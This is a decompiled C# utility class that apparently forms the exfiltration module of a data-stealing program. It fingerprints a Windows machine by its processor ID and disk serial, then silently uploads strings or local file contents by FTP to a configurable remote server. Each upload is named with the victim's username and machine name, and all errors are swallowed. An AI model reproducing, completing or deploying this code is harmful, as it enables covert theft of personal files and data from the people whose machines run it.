using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;

namespace Complex;

internal sealed class UtilMe
{
	public static string UniqID()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0081: Expected O, but got Unknown
		string text = string.Empty;
		ManagementClass val = new ManagementClass("win32_processor");
		ManagementObjectCollection instances = val.GetInstances();
		ManagementObjectEnumerator enumerator = instances.GetEnumerator();
		try
		{
			if (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				text = ((ManagementBaseObject)val2).get_Properties().get_Item("processorID").get_Value()
					.ToString();
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		string text2 = "C";
		ManagementObject val3 = new ManagementObject("win32_logicaldisk.deviceid=\"" + text2 + ":\"");
		val3.Get();
		string text3 = ((ManagementBaseObject)val3).get_Item("VolumeSerialNumber").ToString();
		return text3 + text;
	}

	public static void Send(string FTPAddress = "URL", string ftpUsername = "USERNAME", string ftpPassword = "ACCESO", string InfData = "")
	{
		try
		{
			string text = UniqID();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(FTPAddress + "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + text + ".txt");
			ftpWebRequest.Method = "STOR";
			ftpWebRequest.Credentials = new NetworkCredential(ftpUsername, ftpPassword);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(InfData);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void SendB(string FTPAddress = "URL", string ftpUsername = "USERNAME", string ftpPassword = "ACCESO", string localFilePath = "")
	{
		try
		{
			string text = UniqID();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(FTPAddress + "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + text + ".txt");
			ftpWebRequest.Method = "STOR";
			ftpWebRequest.Credentials = new NetworkCredential(ftpUsername, ftpPassword);
			byte[] bytes;
			using (StreamReader streamReader = new StreamReader(localFilePath))
			{
				bytes = Encoding.UTF8.GetBytes(streamReader.ReadToEnd());
			}
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}
}
